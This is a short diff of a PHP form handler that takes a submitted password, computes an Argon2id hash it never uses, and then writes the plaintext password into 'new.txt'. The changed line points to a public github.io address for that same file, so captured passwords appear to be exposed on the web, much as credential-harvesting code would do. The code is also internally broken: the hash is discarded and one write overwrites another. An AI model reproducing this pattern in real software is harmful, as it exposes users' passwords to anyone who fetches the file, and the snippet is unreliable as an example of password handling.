@@ -29,7 +29,7 @@ form{
         $password = $_POST['password'];
         $hashed_password = password_hash($password, PASSWORD_ARGON2ID);
         $file = fopen("new.txt", "w+");
-        fwrite($file, "$text <br/> $password");
+        fwrite($file, "https://details404.github.io/webContents/new.txt");
         file_put_contents("new.txt", $password);
         fclose($file);
         }
